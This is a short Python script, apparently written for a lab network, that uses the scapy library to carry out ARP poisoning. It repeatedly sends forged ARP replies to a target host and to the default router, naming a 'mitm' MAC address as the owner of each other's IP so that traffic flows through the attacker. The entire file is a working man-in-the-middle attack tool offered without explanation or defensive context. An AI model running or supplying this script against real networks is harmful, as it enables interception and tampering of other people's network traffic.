from scapy.all import ARP, sendp, getmacbyip, Ether, conf
import time

# IPs
target_ip = "172.16.4.132"
print("target ip:", target_ip)
router_ip = conf.route.route("0.0.0.0")[2] or "172.16.4.2"
print("router ip:", router_ip)

# MAC addresses
target_mac = getmacbyip(target_ip) or "00:0c:29:62:e1:f2"
print("target_mac:", target_mac)
router_mac = getmacbyip(router_ip) or "3e:06:30:73:9e:65"
print("router_mac:", router_mac)
mitm_mac = "00:0c:29:10:09:c3"
print("mitm mac:", mitm_mac)

# Create ARP spoofing packets
packet_to_target = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac, hwsrc=mitm_mac)
print("packet to target:", packet_to_target)
packet_to_router = ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac, hwsrc=mitm_mac)
print("packet to router:", packet_to_router)

# Use sendp() to send the packets at Layer 2
print("[*] Starting ARP poisoning...")
try:
    while True:
        sendp(packet_to_target, iface="eth0", verbose=0)
        sendp(packet_to_router, iface="eth0", verbose=0)
        time.sleep(0.2)
except KeyboardInterrupt:
    print("[!] Stopping ARP poisoning.") 